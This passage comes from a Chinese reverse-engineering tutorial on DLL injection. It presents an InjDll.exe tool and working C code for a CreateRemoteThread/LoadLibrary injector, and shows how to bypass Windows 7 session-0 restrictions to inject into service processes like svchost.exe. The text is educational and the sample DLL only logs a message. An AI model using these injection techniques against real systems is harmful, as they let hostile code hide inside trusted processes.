    <content type="html"><![CDATA[<p>第44章InjDILexe： DLL注入专用工具</p><p>我编写了一个InjDll.exe程序，使用该程序可以向目标进程（Target）注入或卸载指定的DLL文件。本章将向大家介绍这一DLL注入专用工具。</p><h1 id="44-1-InjDll-exe"><a href="#44-1-InjDll-exe" class="headerlink" title="44.1 InjDll.exe"></a>44.1 InjDll.exe</h1><p>InjDll.exe是前面练习示例中经常使用的程序，我对源代码进行了调整并添加了一些功能，现在正式发布供大家使用。</p><p>※ InjDll.exe程序是公幵的，大家可以自由使用。InjDll.exe程序默认支持Windows 2000以上版本的操作系统（不支持Windows 9X系列），并且支持32位&#x2F;64位操作系统（请根据操作系统选用合适的版本）。</p><blockquote><p>在各平台（32&#x2F;64位）进行DLL注入时请注意以下几点：</p></blockquote><blockquote><p>-<br>若目标进程为32位：Injector&amp;Dll —全为32位（PE32格式）。</p></blockquote><blockquote><p>-<br>若目标进程为64位：Injector &amp; D11 -&gt;全为64位（PE32+格式）。</p></blockquote><blockquote><p>由于32&#x2F;64位进程在64位OS中均可运行，所以需要先查看目标进程的PE文件格 式，再选用合适的注入程序（InjDll32&#x2F;InjDll64 ）和DLL。</p></blockquote><h2 id="44-1-1使用方法"><a href="#44-1-1使用方法" class="headerlink" title="44.1.1使用方法"></a>44.1.1使用方法</h2><p>使用方法如图44-1所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC44%E7%AB%A0%20InjDll.exe%EF%BC%9ADLL%E6%B3%A8%E5%85%A5%E4%B8%93%E7%94%A8%E5%B7%A5%E5%85%B7.assets/image-20220319194620292.png#alt=image-20220319194620292"></p><p>InjDll32.exe是一个控制台程序，它接收3个参数，各参数的含义说明如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">&lt;procname|pid|*&gt;<br>procnameProcess <span class="hljs-title function_">name</span> <span class="hljs-params">(ex: explorer.exe, notepad.exe 等）</span><br><span class="hljs-params">pidProcess ID</span><br><span class="hljs-params">*All Processes</span><br><span class="hljs-params">                              </span><br><span class="hljs-params">&lt;-i|-e&gt;</span><br><span class="hljs-params">-iInjection Mode</span><br><span class="hljs-params">-eEjection Mode</span><br><span class="hljs-params"></span><br><span class="hljs-params"></span><br><span class="hljs-params">&lt;dll path&gt;DLL File Path (relative or full)</span><br></code></pre></td></tr></table></figure><p>InjDll64.exe （64位版本）的使用方法与InjDll32.exe （ 32位版本）一样。</p><h2 id="44-1-2使用示例"><a href="#44-1-2使用示例" class="headerlink" title="44.1.2使用示例"></a>44.1.2使用示例</h2><p>示例1：向PID为1032的进程注入c:\work\dummy32.dll文件（参考图44-2）</p><p>示例2：向旧进程注入当前目录下的dummy32.dll文件（参考图44-3）。</p><p>示例3：向所有进程注入c:\work\dummy.dll文件（参考图44-4）</p><p>卸载DLL文件时，用-e选项替换-i选项即可。</p><h2 id="44-1-3注意事项"><a href="#44-1-3注意事项" class="headerlink" title="44.1.3注意事项"></a>44.1.3注意事项</h2><p>（1） 由于采用了执行远程线程调用LoadLibraryO的工作方式，所以如果kemel32.dll未加载到目标进程，注入&#x2F;卸载操作将失败。</p><p>（2） 向访问权限受限的（受保护的）进程、或应用了反注入技术的进程进行注入&#x2F;卸载操作时可能失败。</p><p>（3）原则上，进行N次注入操作后，必须执行相同次数的卸载操作，才能将相关DLL文件完全卸载。</p><p>（4） 注入前先查看目标进程的PE文件格式（ 32位的PE32还是64位的PE32+ ），然后再选择相应的注入程序（InjDll32.exe、InjDll64.exe ）与DLL文件（32位的PE32、64位的PE32+）。</p>]]></content>
    
    
    <categories>
      
      <category>Binary</category>
      
      <category>逆向工程核心原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Binary</tag>
      
      <tag>逆向工程核心原理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第43章 内核6中的DLL注入</title>
    <link href="/1999/04/03/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC43%E7%AB%A0%20%E5%86%85%E6%A0%B86%E4%B8%AD%E7%9A%84DLL%E6%B3%A8%E5%85%A5/"/>
    <url>/1999/04/03/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC43%E7%AB%A0%20%E5%86%85%E6%A0%B86%E4%B8%AD%E7%9A%84DLL%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<p>第43章内核6中的DLL注入</p><p>本章将讲解在Windows OS Kernel 6 （Vista、7、8等）中实施DLL注入的方法。由于从Kernel 6开始采用了新的会话管理机制，这使得通过CreateRemoteThread() API注入DLL的旧方法对某些进程（服务进程）不再适用。本章将调试相关API，分析注入失败的原因，然后寻求解决之道。原有的DLL注入技术是通过调用CreateRemoteThread() API进行的，在Windows XP、2000中能够准确完成DLL注入操作。但Windows 7中该方法不太奏效，准确地说就是，在Windows 7中使用CreateRemoteThread() API无法完成对服务（Service）进程的DLL注入操作。原因在于，Windows7中的会话管理机制已经发生了变化。下面通过一个简单的练习示例再现DLL注入失败的情形，并分析失败原因，进而查找解决之策。</p><blockquote><p>本示例文件在Windows7 32位系统中通过测试。</p></blockquote><h1 id="43-1-再现DLL注入失败"><a href="#43-1-再现DLL注入失败" class="headerlink" title="43.1 再现DLL注入失败"></a>43.1 再现DLL注入失败</h1><p>尝试将Dummy.dll文件注入Windows的系统进程时，会出现注入失败。本节中再现这种注入失败的情形（注入程序是之前用过的InjectDll.exe）。</p><h2 id="43-1-1-源代码"><a href="#43-1-1-源代码" class="headerlink" title="43.1.1 源代码"></a>43.1.1 源代码</h2><p>先简单看一下相关源代码。</p><p><strong>InjectDll.cpp</strong></p><p>源代码中的核心部分是InjectDll()函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL <span class="hljs-title function_">InjectDll</span><span class="hljs-params">(DWORD dwPID, LPCTSTR szDllPath)</span><br>&#123;<br>    HANDLE hProcess = <span class="hljs-literal">NULL</span>, hThread = <span class="hljs-literal">NULL</span>;<br>    HMODULE hMod = <span class="hljs-literal">NULL</span>;<br>    LPVOID pRemoteBuf = <span class="hljs-literal">NULL</span>;<br>    DWORD dwBufSize = (DWORD)(_tcslen(szDllPath) + <span class="hljs-number">1</span>) * <span class="hljs-keyword">sizeof</span>(TCHAR);<br>    LPTHREAD_START_ROUTINE pThreadProc;<br><br>    <span class="hljs-keyword">if</span> ( !(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)) )<br>    &#123;<br>        _tprintf(<span class="hljs-string">L&quot;OpenProcess(%d) failed!!! [%d]\n&quot;</span>, dwPID, GetLastError());<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br><br>    pRemoteBuf = VirtualAllocEx(hProcess, <span class="hljs-literal">NULL</span>, dwBufSize, MEM_COMMIT, PAGE_READWRITE);<br><br>    WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllPath, dwBufSize, <span class="hljs-literal">NULL</span>);<br><br>    hMod = GetModuleHandle(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);<br>    pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hMod, <span class="hljs-string">&quot;LoadLibraryW&quot;</span>);<br><br>    hThread = CreateRemoteThread(hProcess, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, pThreadProc, pRemoteBuf, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>    WaitForSingleObject(hThread, INFINITE);<br><br>    CloseHandle(hThread);<br>    CloseHandle(hProcess);<br><br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br><span class="hljs-type">int</span> _tmain(<span class="hljs-type">int</span> argc, TCHAR *argv[])<br>&#123;<br>    <span class="hljs-keyword">if</span>( argc != <span class="hljs-number">3</span>)<br>    &#123;<br>        _tprintf(<span class="hljs-string">L&quot;USAGE : %s &lt;pid&gt; &lt;dll_path&gt;\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// change privilege</span><br>    <span class="hljs-keyword">if</span>( !SetPrivilege(SE_DEBUG_NAME, TRUE) )<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br><br>    <span class="hljs-comment">// inject dll</span><br>    <span class="hljs-keyword">if</span>( InjectDll((DWORD)_tstol(argv[<span class="hljs-number">1</span>]), argv[<span class="hljs-number">2</span>]) )<br>        _tprintf(<span class="hljs-string">L&quot;InjectDll(\&quot;%s\&quot;) success!!!\n&quot;</span>, argv[<span class="hljs-number">2</span>]);<br>    <span class="hljs-keyword">else</span><br>        _tprintf(<span class="hljs-string">L&quot;InjectDll(\&quot;%s\&quot;) failed!!!\n&quot;</span>, argv[<span class="hljs-number">2</span>]);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>代码43-1是典型的DLL注入代码，前面我们已经多次分析过，相信大家已经非常熟悉了（更多说明请参考第23章）。</p><p><strong>Dummy.cpp</strong></p><p>接下来查看Dummy.dll文件的源代码（dummy.cpp）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL WINAPI <span class="hljs-title function_">DllMain</span><span class="hljs-params">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)</span><br>&#123;<br>    TCHAR   szPath[MAX_PATH]    = &#123;<span class="hljs-number">0</span>,&#125;;<br>    TCHAR   szMsg[<span class="hljs-number">1024</span>]         = &#123;<span class="hljs-number">0</span>,&#125;;<br>    TCHAR   *p                  = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-keyword">switch</span>( fdwReason )<br>    &#123;<br>        <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH : <br>            GetModuleFileName(<span class="hljs-literal">NULL</span>, szPath, MAX_PATH);<br>            p = _tcsrchr(szPath, <span class="hljs-string">L&#x27;\\&#x27;</span>);<br>            <span class="hljs-keyword">if</span>( p != <span class="hljs-literal">NULL</span> )<br>            &#123;<br>                _stprintf_s(szMsg, <span class="hljs-number">1024</span> - <span class="hljs-keyword">sizeof</span>(TCHAR), <br>                            <span class="hljs-string">L&quot;Injected in %s(%d)&quot;</span>, <br>                            p + <span class="hljs-number">1</span>,                          <span class="hljs-comment">// Process Name</span><br>                            GetCurrentProcessId());         <span class="hljs-comment">// PID</span><br>                OutputDebugString(szMsg);<br>            &#125;<br>            <br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><p>DllMain()函数代码非常简单，若dummy.dll被成功注入指定进程，就输出相关调试信息（进程名称、进程ID）。</p><h2 id="43-1-2注入测试"><a href="#43-1-2注入测试" class="headerlink" title="43.1.2注入测试"></a>43.1.2注入测试</h2><p>首先运行Process Explorer工具，查看目标进程的PID （svhost.exe （属于会话0，PID为3300）、notepad.exe（属于会话1，PID为3964）），然后再使用InjectDll.exe分别向它们注入dummy.dll文件，如图43-1所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC43%E7%AB%A0%20%E5%86%85%E6%A0%B86%E4%B8%AD%E7%9A%84DLL%E6%B3%A8%E5%85%A5.assets/image-20220318203936101.png#alt=image-20220318203936101"></p><p>注入前先把lnjectDll.exe与dummy.dll文件复制到工作文件夹，然后运行InjectDll.exe命令实施注入，如图43-2所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC43%E7%AB%A0%20%E5%86%85%E6%A0%B86%E4%B8%AD%E7%9A%84DLL%E6%B3%A8%E5%85%A5.assets/image-20220318204656021.png#alt=image-20220318204656021"></p><p>dummy.dll文件成功注入notepad.exe进程（属于会话1，PID为3964）,但向svchost.exe （属于会话0，PID为3300）注入时却发生了失败（error code&#x3D;8）。在Process Explorer中搜索dummy.dll模块。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC43%E7%AB%A0%20%E5%86%85%E6%A0%B86%E4%B8%AD%E7%9A%84DLL%E6%B3%A8%E5%85%A5.assets/image-20220318204757400.png#alt=image-20220318204757400"></p><p>就像在图43-3中看到的一样，dummy.dll文件只成功注入notepad.exe进程（属于会话1，PID为3964）。</p><h1 id="43-2原因分析"><a href="#43-2原因分析" class="headerlink" title="43.2原因分析"></a>43.2原因分析</h1><h2 id="43-2-1-调试-1"><a href="#43-2-1-调试-1" class="headerlink" title="43.2.1 调试 #1"></a>43.2.1 调试 #1</h2><p>如图43-2所示，向svchost.exe进程（属于会话0，PID为3300）注入的过程中，调用CreateRemoteThread() API 函数时发生了失败，错误代码为8 （ERROR_NOT_ENOUGH_MEMORY）。下面使用OllyDbg工具调试InjectDll.exe文件。在Open对话框中选择InjectDll.exe文件，输入相应参数后单击“打开”按钮，如图43-4所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC43%E7%AB%A0%20%E5%86%85%E6%A0%B86%E4%B8%AD%E7%9A%84DLL%E6%B3%A8%E5%85%A5.assets/image-20220318205421422.png#alt=image-20220318205421422"></p><p>我们已经知道调用CreateRemoteThread() API时会发生错误，所以使用鼠标右键菜单中的Search for All intermodular calls菜单，直接在API的调用代码处设置断点，如图43-5所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC43%E7%AB%A0%20%E5%86%85%E6%A0%B86%E4%B8%AD%E7%9A%84DLL%E6%B3%A8%E5%85%A5.assets/image-20220318205534757.png#alt=image-20220318205534757"></p><blockquote><p>InjectDll.exe进程中并未应用ASLR技术。</p></blockquote><p>按F9运行程序，调试器将在断点处暂停，如图43-6所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC43%E7%AB%A0%20%E5%86%85%E6%A0%B86%E4%B8%AD%E7%9A%84DLL%E6%B3%A8%E5%85%A5.assets/image-20220318205355313.png#alt=image-20220318205355313"></p><p>然后按F8键（StepOver）执行调用指令，在OllyDbg的寄存器窗口中可以看到“LastErr&#x3D;ERROR_NOT_ENOUGH_MEMORY（8）” 字样，如图43-7所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC43%E7%AB%A0%20%E5%86%85%E6%A0%B86%E4%B8%AD%E7%9A%84DLL%E6%B3%A8%E5%85%A5.assets/image-20220318205644201.png#alt=image-20220318205644201"></p><p>以上通过OllyDbg工具再现了注入失败的情形，但仍未能找到确切原因。只有直接调试kernel32!CreateRemoteThread() API才能准确把握失败原因。</p><h2 id="43-2-2调试-2"><a href="#43-2-2调试-2" class="headerlink" title="43.2.2调试 #2"></a>43.2.2调试 #2</h2><p>重新运行OllyDbg调试器，暂停在InjectDll.exe调用CreateRemoteThread()的代码处（参考图43-8）。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC43%E7%AB%A0%20%E5%86%85%E6%A0%B86%E4%B8%AD%E7%9A%84DLL%E6%B3%A8%E5%85%A5.assets/image-20220318223255867.png#alt=image-20220318223255867"></p><p>查看存储在栈中的CreateRemoteThread() API的参数，如图43-9所示</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC43%E7%AB%A0%20%E5%86%85%E6%A0%B86%E4%B8%AD%E7%9A%84DLL%E6%B3%A8%E5%85%A5.assets/image-20220318223321264.png#alt=image-20220318223321264"></p><p>对上图中的重要参数说明如下：</p><p>① svchost.exe （PID： 3300）的进程句柄。</p><p>② kernel32!LoadLibraryA() API地址。</p><p>③ svchost.exe的进程内存中分配的缓冲区地址。</p><p>在图43-8中使用StepIn（F7）命令，进入kernel32!CreateRemoteThreacl()API,如图43-10所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC43%E7%AB%A0%20%E5%86%85%E6%A0%B86%E4%B8%AD%E7%9A%84DLL%E6%B3%A8%E5%85%A5.assets/image-20220318223703353.png#alt=image-20220318223703353"></p><blockquote><p>kernelbase.dll 是从 Vista 开始新增的 DLL 文件，负责包装（wrapper） kernel32.dll。</p></blockquote><p>继续按F7键运行到kernelbase!CreateRemoteThreadEx()调用前，查看栈中存储的参数，如图</p><p>43-11所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC43%E7%AB%A0%20%E5%86%85%E6%A0%B86%E4%B8%AD%E7%9A%84DLL%E6%B3%A8%E5%85%A5.assets/image-20220318223909295.png#alt=image-20220318223909295"></p><p>kernelbase! CreateRemoteThreadEx()的参数与kernel32!CreateRemoteThread()的参数几乎一样，</p><p>只多了 1 个 IpAttributeList 参数（Arg8）。继续进人 kernelbase!CreateRemoteThreadEx()代码</p><p>（StepInto（F7）），在代码窗口中向下拖动滚动条，可以看到调用ntdll!ZwCreateThreadEx() API的代码，如图43-12所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC43%E7%AB%A0%20%E5%86%85%E6%A0%B86%E4%B8%AD%E7%9A%84DLL%E6%B3%A8%E5%85%A5.assets/image-20220318224020267.png#alt=image-20220318224020267"></p><p>运行到ZwCreateThreadEx()调用前，查看栈中存储的参数，如图43-13所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC43%E7%AB%A0%20%E5%86%85%E6%A0%B86%E4%B8%AD%E7%9A%84DLL%E6%B3%A8%E5%85%A5.assets/image-20220318224348841.png#alt=image-20220318224348841"></p><p>从栈中可以看到，ZwCreateThreadEx()拥有很多个参数。比较图43-9与图43-13可以发现，重</p><p>要的参数①~③都被原样传递过来。继续跟踪进人ntdll!ZwCreateThreadEx()API，可以看到它最终</p><p>通过SYSENTER指令进人内核模式，无法继续用户模式调试。</p><p>实际上，kernelbase!CreateRemoteThreadEx()与ntdll!ZwCreateThreadEx()都是从Vista开始新增的API （XP之前的版本中不存在）。在XP操作系统中，kernel32!CreateRemoteThread()内部会直接调用ZwCreateThreadEx()函数。在Windows XP与Windows 7中调用kernel32!CreateRemoteThread()的流程分别如图43-14所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC43%E7%AB%A0%20%E5%86%85%E6%A0%B86%E4%B8%AD%E7%9A%84DLL%E6%B3%A8%E5%85%A5.assets/image-20220318224921144.png#alt=image-20220318224921144"></p><p>到此我们可以推测岀，DLL注入失败的原因在于系统中这些新增的API，正是它们导致了向运行在会话0中的服务进程注入DLL操作失败。</p><p><strong>Ntdll!ZwCreateThreadEx()</strong></p><p>由于kernelbase!CreateRemoteThreadEx()只是kernel32!CreateRemoteThread()的包装器（wrapper）,所以问题的原因可能在ntdll!ZwCreateThreadEx()中。ntdll!ZwCreateThreadEx()是一个尚未公开的API, MSDN中查不到函数的定义，使用Google搜索查找。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-title function_">NTSTATUS</span> <span class="hljs-params">(WINAPI *LPFUN_NtCreateThreadEx)</span><br><span class="hljs-params">(</span><br><span class="hljs-params">  OUT PHANDLE hThread,</span><br><span class="hljs-params">  IN ACCESS_MASK DesiredAccess,</span><br><span class="hljs-params">  IN LPVOID ObjectAttributes,</span><br><span class="hljs-params">  IN HANDLE ProcessHandle,</span><br><span class="hljs-params">  IN LPTHREAD_START_ROUTINE lpStartAddress,</span><br><span class="hljs-params">  IN LPVOID lpParameter,</span><br><span class="hljs-params">  IN BOOL CreateSuspended,</span><br><span class="hljs-params">  IN ULONG StackZeroBits,</span><br><span class="hljs-params">  IN ULONG SizeOfStackCommit,</span><br><span class="hljs-params">  IN ULONG SizeOfStackReserve,</span><br><span class="hljs-params">  OUT LPVOID lpBytesBuffer</span><br><span class="hljs-params">)</span>;<br><br># This function is almost similar to CreateRemoteThread function except the last parameter which takes unknown buffer structure. Here is the definition of that buffer structure parameter...<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">NtCreateThreadExBuffer</span></span><br><span class="hljs-class">&#123;</span><br>  ULONG Size;<br>  ULONG Unknown1;<br>  ULONG Unknown2;<br>  PULONG Unknown3;<br>  ULONG Unknown4;<br>  ULONG Unknown5;<br>  ULONG Unknown6;<br>  PULONG Unknown7;<br>  ULONG Unknown8;<br>&#125;;<br></code></pre></td></tr></table></figure><p>通过Google搜索发现，在Windows Vista以后的OS中进行DLL注入操作时，直接调用ZwCreateThreadEx()而非CreateRemoteThread()就能成功注入DLL。从我的测试结果看，这样做非常成功，且不受所在会话的影响。</p><p>比较该方法中使用的参数与图43-13中的参数可以发现，它们的不同在于第七个参数（CreateSuspended）。直接调用ZwCreateThreadEx()成功注入DLL时，CreateSuspended参数值为FALSE(0)，而在CreateRemoteThread() API内部调用ZwCreateThreadEx()时，该CreateSuspended参数值为TRUE(1)。这就是DLL注入失败的原因。</p><blockquote><p>从Windows XP开始，CreateRemoteThread() API内部的实现算法采用了挂起模式，即先创建出线程，再使用“恢复运行”方法继续执行（CreateSuspended&#x3D;1）。</p></blockquote><h1 id="43-3练习：使-CreateRemoteThread-正常工作"><a href="#43-3练习：使-CreateRemoteThread-正常工作" class="headerlink" title="43.3练习：使 CreateRemoteThread()正常工作"></a>43.3练习：使 CreateRemoteThread()正常工作</h1><p>我们现在已经知道了DLL注入失败的原因，也知道了解决方法，下面使用调试器直接修改测试，使调用CreateRemoteThread() API能够成功完成注入操作。</p><h2 id="43-3-1-方法-1-修改-CreateSuspended-参数值"><a href="#43-3-1-方法-1-修改-CreateSuspended-参数值" class="headerlink" title="43.3.1 方法 #1:修改 CreateSuspended 参数值"></a>43.3.1 方法 #1:修改 CreateSuspended 参数值</h2><p>修改 ZwCreateThreadEx() API 的 CreateSuspended参数值，就可在 Windows 7中成功调用CreateRemoteThread()API。重启调试器，运行到图43-12中调用ntdll.ZwCreateThreadEx()函数的位置，然后将存储在栈中的CreateSuspended参数值由1修改为0，如图43-15所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC43%E7%AB%A0%20%E5%86%85%E6%A0%B86%E4%B8%AD%E7%9A%84DLL%E6%B3%A8%E5%85%A5.assets/image-20220318233211858.png#alt=image-20220318233211858"></p><p>接下来使用StepOver（F8）命令，运行到ZwCreateThreadEx()调用后，dummy.dll成功注入指定服务进程，如图43-16所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC43%E7%AB%A0%20%E5%86%85%E6%A0%B86%E4%B8%AD%E7%9A%84DLL%E6%B3%A8%E5%85%A5.assets/image-20220319155539289.png#alt=image-20220319155539289"></p><p>使用DebugView工具可以查看dummy.dll的DllMain()函数中输出的调试日志，如图43-17所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC43%E7%AB%A0%20%E5%86%85%E6%A0%B86%E4%B8%AD%E7%9A%84DLL%E6%B3%A8%E5%85%A5.assets/image-20220319155608541.png#alt=image-20220319155608541"></p><p>在Windows 7中修改CreateSuspended参数值，借助CreateRemoteThread()API将指定DLL文件成功注入svchost.exe服务进程。</p><h2 id="43-3-2方法-2-操纵条件分支"><a href="#43-3-2方法-2-操纵条件分支" class="headerlink" title="43.3.2方法#2:操纵条件分支"></a>43.3.2方法#2:操纵条件分支</h2><p>进一步调试kernelbase!CreateRemoteThreadEx()函数可以发现更多内容。在图43-12中，直接使用StepOver（F8）命令，执行到调用ZwCreateThreadEx()函数（CreateSuspended&#x3D;TRUE）后，第一个参数pThread Handle被赋值，如图43-18所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC43%E7%AB%A0%20%E5%86%85%E6%A0%B86%E4%B8%AD%E7%9A%84DLL%E6%B3%A8%E5%85%A5.assets/image-20220318235214562.png#alt=image-20220318235214562"></p><p>创建岀线程句柄就意味着线程正常创建，也就是说，调用CreateRemoteThread()的过程中成功创建了远程线程。</p><p>这是一个非常重要的发现。虽然远程线程已被成功创建，但它无法正常工作，原因可能是后面调用ntdlllZwResumeThread()API时发生了失败，或者干脆无法调用（由于线程是以挂起模式创建的，必须“恢复运行”才能正常执行）。继续跟踪，查看调用ZwResumeThread() API的部分。 图43-19中是kernelbase!CreateRemoteThread() API代码的结束部分。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC43%E7%AB%A0%20%E5%86%85%E6%A0%B86%E4%B8%AD%E7%9A%84DLL%E6%B3%A8%E5%85%A5.assets/image-20220318235748184.png#alt=image-20220318235748184"></p><p>从图43-19中可以发现，调用758EBD33地址处的ntdll!CsrClientCallServer() API后，其下的条件分支指令（CMP&#x2F;JL）使ZwResumeThread() API未被调用而直接跳转到后面。在调试器中调用ntdll!CsrClientCallServer() API后，操纵下面的条件分支指令使ZwResumeThread()得以调用执行，从而将DLL文件成功注入指定进程。根据Intel IA-32 Reference可知，SF!&#x3D;OF时JL指令就会执行发生跳转，如图43-20所示，使用鼠标双击S Flag修改其值。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC43%E7%AB%A0%20%E5%86%85%E6%A0%B86%E4%B8%AD%E7%9A%84DLL%E6%B3%A8%E5%85%A5.assets/image-20220318235913097.png#alt=image-20220318235913097"></p><p>继续执行后，检查DLL文件是否成功注入指定进程。</p><p>通过上面的调试，我们掌握了在Windows 7中调用kernel32!CreateRemoteThread() API向服务进程注入DLL文件时失败的原因。并通过操纵kernel32!CreateRemoteThread() API的参数与代码，成功地将DLL文件注入指定服务进程（该方法借助调试器实现，不便推广通用）。接下来，我们 要根据上面的方法编写一个新的InjectDll.exe程序，该程序具有较好的通用性，在Windows7与XP中都能顺利完成DLL注入。</p><blockquote><p>所有源代码均使用MS Visual C++ 2010 Express Edition编写而成，并在Windows 7 &amp;XPSP3中通过测试。</p></blockquote><h1 id="43-4-稍作整理"><a href="#43-4-稍作整理" class="headerlink" title="43.4 稍作整理"></a>43.4 稍作整理</h1><p>正式编写新的DLL注入程序前，先简单整理前面学过的内容。由于Windows 7的会话管理机制发生了变化，kernel32!CreateRemoteThread() API的内部实现代码也发生了变化，最终使借助CreateRemoteThread()进行DLL注入的技术在向Windows7的服务进程（会话0）注入DLL文件时无法正常发挥作用。从调试kernel32!CreateRemoteThread()的结果看，原因在于，在API内部创建远程线程时采用了挂起模式，若远程进程属于会话0,则不会“恢复运行”，而是直接返回错误。</p><blockquote><p>创建远程线程时，先采用挂起模式创建，再“恢复运行”，这是从XP就开始使用的一种实现方法</p></blockquote><p>在kernel32!CreateRemoteThread() API内部调用ntdll!ZwCreateThreadEx() 